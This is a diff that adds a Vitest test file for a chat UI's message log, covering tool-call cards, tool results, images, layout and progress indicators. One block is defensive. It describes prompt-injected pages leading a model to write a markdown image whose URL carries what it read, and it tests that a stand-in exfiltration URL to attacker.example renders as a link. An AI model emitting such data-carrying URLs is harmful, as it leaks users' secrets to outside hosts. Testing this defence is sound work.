@@ -1,0 +1,370 @@
+/**
+ * The transcript's tool-call half, driven.
+ *
+ * What matters: a tool-call-only assistant turn renders as a card and not
+ * as an empty bubble (the ambiguity §0.3 of the diagnostic design found),
+ * the result form is prefilled for the example tool with the acceptance
+ * run's result, Send hands back one `tool` message's worth of data per
+ * call with the matching id, and a `tool` message in the history is
+ * visible -- a harness sends it, so the transcript that is the request
+ * has to show it.
+ */
+
+import { act, fireEvent, render, screen } from "@testing-library/react";
+import { describe, expect, it, vi } from "vitest";
+
+import { ChatLog } from "./ChatLog";
+
+vi.mock("@/lib/useAutoScroll", () => ({
+  useAutoScroll: () => ({
+    scrollRef: { current: null },
+    isAtBottom: true,
+    scrollToBottom: () => {},
+  }),
+}));
+
+describe("ChatLog with tool calls", () => {
+  it("renders image content as the image, without data URLs as text or a text-only edit", () => {
+    render(
+      <ChatLog
+        messages={[
+          {
+            role: "user",
+            content: [
+              { type: "text", text: "Describe this" },
+              { type: "image_url", image_url: { url: "data:image/png;base64,PRIVATE" } },
+            ],
+          },
+        ]}
+        pending={false}
+        onEditUserMessage={vi.fn()}
+      />,
+    );
+    // The pixels render (the composer can attach them now); the bytes
+    // still never appear as text, and an Edit that would flatten the
+    // message to its text half is still not offered.
+    expect(screen.getByText("Describe this")).toBeInTheDocument();
+    expect(screen.getByTestId("message-image")).toHaveAttribute(
+      "src",
+      "data:image/png;base64,PRIVATE",
+    );
+    expect(screen.queryByRole("button", { name: "Edit" })).not.toBeInTheDocument();
+    expect(document.body.textContent).not.toContain("PRIVATE");
+  });
+
+  it("an image the storage fallback stripped says so instead of rendering a broken frame", () => {
+    render(
+      <ChatLog
+        messages={[
+          {
+            role: "user",
+            content: [
+              { type: "text", text: "still here" },
+              { type: "image_url", image_url: { url: "data:," } },
+            ],
+          },
+        ]}
+        pending={false}
+      />,
+    );
+    expect(screen.getByText("still here")).toBeInTheDocument();
+    expect(screen.queryByTestId("message-image")).not.toBeInTheDocument();
+    expect(screen.getByTestId("message-image-stripped")).toBeInTheDocument();
+  });
+  it("renders a tool-call-only turn as a card that says whether the arguments parse", () => {
+    render(
+      <ChatLog
+        pending={false}
+        messages={[
+          { role: "user", content: "weather in Oslo?" },
+          {
+            role: "assistant",
+            content: null,
+            tool_calls: [
+              {
+                id: "call_1",
+                type: "function",
+                function: { name: "get_weather", arguments: '{"city":"Oslo"}' },
+              },
+            ],
+          },
+        ]}
+      />,
+    );
+    const card = screen.getByTestId("tool-call-card");
+    expect(card).toHaveTextContent("get_weather");
+    expect(card).toHaveTextContent('{"city":"Oslo"}');
+    expect(card).toHaveTextContent("arguments parse");
+    // No results form without a handler: tools are not in play.
+    expect(screen.queryByTestId("tool-results-form")).toBeNull();
+  });
+
+  it("flags arguments a model emitted that are not JSON", () => {
+    render(
+      <ChatLog
+        pending={false}
+        messages={[
+          {
+            role: "assistant",
+            content: null,
+            tool_calls: [
+              { id: "c", type: "function", function: { name: "f", arguments: "{city: Oslo" } },
+            ],
+          },
+        ]}
+      />,
+    );
+    expect(screen.getByTestId("tool-call-card")).toHaveTextContent("arguments are not JSON");
+  });
+
+  it("prefills the example result and sends one result per call with its id", () => {
+    const onToolResults = vi.fn();
+    render(
+      <ChatLog
+        pending={false}
+        onToolResults={onToolResults}
+        messages={[
+          { role: "user", content: "weather?" },
+          {
+            role: "assistant",
+            content: null,
+            tool_calls: [
+              {
+                id: "call_w",
+                type: "function",
+                function: { name: "get_weather", arguments: '{"city":"Oslo"}' },
+              },
+              { id: "call_x", type: "function", function: { name: "lookup", arguments: "{}" } },
+            ],
+          },
+        ]}
+      />,
+    );
+    const inputs = screen.getAllByTestId("tool-result") as HTMLTextAreaElement[];
+    expect(inputs).toHaveLength(2);
+    expect(inputs[0]?.value).toBe('{"tempC": -3, "sky": "snow"}');
+    expect(inputs[1]?.value).toBe("");
+    // Incomplete: the second call has no result yet.
+    const send = screen.getByTestId("send-tool-results") as HTMLButtonElement;
+    expect(send.disabled).toBe(true);
+    fireEvent.change(inputs[1]!, { target: { value: '{"found": true}' } });
+    expect(send.disabled).toBe(false);
+    fireEvent.click(send);
+    expect(onToolResults).toHaveBeenCalledWith([
+      { tool_call_id: "call_w", content: '{"tempC": -3, "sky": "snow"}' },
+      { tool_call_id: "call_x", content: '{"found": true}' },
+    ]);
+  });
+
+  it("does not offer a results form while a turn is pending or once results were sent", () => {
+    const messages = [
+      {
+        role: "assistant" as const,
+        content: null,
+        tool_calls: [
+          {
+            id: "c",
+            type: "function" as const,
+            function: { name: "get_weather", arguments: "{}" },
+          },
+        ],
+      },
+    ];
+    const { rerender } = render(
+      <ChatLog pending={true} onToolResults={() => {}} messages={messages} />,
+    );
+    expect(screen.queryByTestId("tool-results-form")).toBeNull();
+    rerender(
+      <ChatLog
+        pending={false}
+        onToolResults={() => {}}
+        messages={[...messages, { role: "tool", content: '{"tempC":-3}', tool_call_id: "c" }]}
+      />,
+    );
+    expect(screen.queryByTestId("tool-results-form")).toBeNull();
+    // And the tool result is on screen, as the request has it.
+    expect(screen.getByTestId("tool-result-message")).toHaveTextContent('{"tempC":-3}');
+    expect(screen.getByTestId("tool-result-message")).toHaveTextContent("tool result · c");
+  });
+});
+
+describe("ChatLog with images in a model's reply", () => {
+  // A prompt-injected page can make a model write an image whose address
+  // carries what it read. Rendering it as an <img> fetches that address the
+  // moment the reply arrives, with nobody clicking anything.
+  const leak = "https://attacker.example/pixel.png?q=SECRET";
+
+  it("renders a markdown image in a reply as a link, never an image", () => {
+    render(
+      <ChatLog
+        messages={[{ role: "assistant", content: `Here you go: ![a chart](${leak})` }]}
+        pending={false}
+      />,
+    );
+    expect(document.querySelector(`img[src="${leak}"]`)).toBeNull();
+    expect(document.querySelectorAll("img")).toHaveLength(0);
+    const link = screen.getByRole("link", { name: /a chart/ });
+    expect(link).toHaveAttribute("href", leak);
+    expect(link).toHaveAttribute("target", "_blank");
+    expect(link).toHaveAttribute("rel", "noreferrer");
+    // The address is visible, so nobody opens it without seeing where it goes.
+    expect(link).toHaveTextContent(leak);
+  });
+
+  it("names an image with no alt text as an image", () => {
+    render(<ChatLog messages={[{ role: "assistant", content: `![](${leak})` }]} pending={false} />);
+    expect(document.querySelectorAll("img")).toHaveLength(0);
+    expect(screen.getByRole("link", { name: /image/ })).toHaveAttribute("href", leak);
+  });
+});
+
+describe("a long unbroken token", () => {
+  it("wraps inside its bubble rather than running past it", () => {
+    // jsdom lays nothing out, so this pins the rule that does the work:
+    // overflow-wrap on the bubble, and a bubble allowed to be narrower
+    // than its longest word.
+    const url = `https://example.com/${"a".repeat(400)}`;
+    render(<ChatLog messages={[{ role: "assistant", content: url }]} pending={false} />);
+    const bubble = screen.getByTestId("message-bubble");
+    expect(bubble.className).toMatch(/(^|\s)break-words(\s|$)/);
+    expect(bubble.className).toMatch(/(^|\s)min-w-0(\s|$)/);
+  });
+});
+
+describe("a message's actions on a touch screen", () => {
+  it("are shown, since there is no hover to reveal them", () => {
+    // `hover:` only applies under (hover: hover), so on a phone the row
+    // stayed at opacity 0 and still took taps.
+    render(<ChatLog messages={[{ role: "assistant", content: "hi" }]} pending={false} />);
+    const row = screen.getByTitle("Copy this message").parentElement!;
+    expect(row.className).toMatch(/(^|\s)opacity-0(\s|$)/);
+    expect(row.className).toMatch(/(^|\s)pointer-coarse:opacity-100(\s|$)/);
+  });
+});
+
+describe("the conversation, to a screen reader", () => {
+  it("is a log, busy while an answer is still arriving", () => {
+    const { rerender } = render(
+      <ChatLog messages={[{ role: "user", content: "hi" }]} pending={true} />,
+    );
+    const log = screen.getByRole("log", { name: "Conversation" });
+    expect(log).toHaveAttribute("aria-busy", "true");
+    rerender(
+      <ChatLog
+        messages={[
+          { role: "user", content: "hi" },
+          { role: "assistant", content: "hello" },
+        ]}
+        pending={false}
+      />,
+    );
+    expect(log).toHaveAttribute("aria-busy", "false");
+  });
+
+  it("says it is working only until the answer starts", () => {
+    const { rerender } = render(
+      <ChatLog messages={[{ role: "user", content: "hi" }]} pending={true} />,
+    );
+    // Amended 2026-09-27: with nothing from the stream yet, it says only
+    // what is known.
+    expect(screen.getByTestId("working-indicator")).toHaveTextContent("Waiting for the model");
+    rerender(
+      <ChatLog
+        messages={[
+          { role: "user", content: "hi" },
+          { role: "assistant", content: "Half an ans" },
+        ]}
+        pending={true}
+      />,
+    );
+    expect(screen.queryByTestId("working-indicator")).toBeNull();
+  });
+
+  it("counts, and after twenty seconds says why it can take this long", () => {
+    // 2026-09-27: a prompt to a model on the processor showed one still
+    // line, read as a failure, and was abandoned while the answer came.
+    vi.useFakeTimers();
+    try {
+      render(<ChatLog messages={[{ role: "user", content: "hi" }]} pending={true} />);
+      expect(screen.getByTestId("working-elapsed")).toHaveTextContent("0 s");
+      expect(screen.queryByTestId("working-still")).toBeNull();
+      act(() => vi.advanceTimersByTime(19_000));
+      expect(screen.getByTestId("working-elapsed")).toHaveTextContent("19 s");
+      expect(screen.queryByTestId("working-still")).toBeNull();
+      act(() => vi.advanceTimersByTime(66_000));
+      expect(screen.getByTestId("working-elapsed")).toHaveTextContent("1 min 25 s");
+      // Amended 2026-09-27: a hosted model can be slow too, so the
+      // sentence no longer assumes the processor.
+      expect(screen.getByTestId("working-still")).toHaveTextContent(
+        "A large model, or one running on the processor, can take a few minutes to start",
+      );
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+});
+
+describe("an answer with nothing in it", () => {
+  it("says so, instead of an empty bubble, and offers nothing to copy", () => {
+    render(<ChatLog messages={[{ role: "assistant", content: "" }]} pending={false} />);
+    expect(screen.getByTestId("empty-reply")).toHaveTextContent("The model sent no text.");
+    expect(screen.queryByTitle("Copy this message")).toBeNull();
+  });
+
+  it("is not a tool-call turn, which has its cards instead of text", () => {
+    render(
+      <ChatLog
+        messages={[
+          {
+            role: "assistant",
+            content: null,
+            tool_calls: [
+              {
+                id: "c1",
+                type: "function",
+                function: { name: "get_weather", arguments: '{"city":"Oslo"}' },
+              },
+            ],
+          },
+        ]}
+        pending={false}
+      />,
+    );
+    expect(screen.queryByTestId("empty-reply")).toBeNull();
+  });
+});
+
+describe("what the model is doing (2026-09-27)", () => {
+  it("comes back between two parts of an answer when the backend says it is busy", () => {
+    // Claude Code writes a sentence, runs a tool, writes again.
+    const messages = [
+      { role: "user" as const, content: "What is in a.txt?" },
+      { role: "assistant" as const, content: "Let me look." },
+    ];
+    const { rerender } = render(<ChatLog messages={messages} pending={true} />);
+    expect(screen.queryByTestId("working-indicator")).toBeNull();
+    rerender(
+      <ChatLog
+        messages={messages}
+        pending={true}
+        work={{ progress: { stage: "tool", tool: "Read" } }}
+      />,
+    );
+    expect(screen.getByTestId("working-headline")).toHaveTextContent("Using a tool: Read");
+  });
+
+  it("says a model that only thought sent no answer, with its thinking kept", () => {
+    render(
+      <ChatLog
+        messages={[
+          { role: "assistant", content: "", reasoning: "Round and round", thoughtMs: 61_000 },
+        ]}
+        pending={false}
+      />,
+    );
+    expect(screen.getByTestId("empty-reply")).toHaveTextContent(
+      "The model thought, but sent no answer.",
+    );
+    expect(screen.getByTestId("thinking")).toHaveTextContent("Thought for 1 min 1 s");
+  });
+});
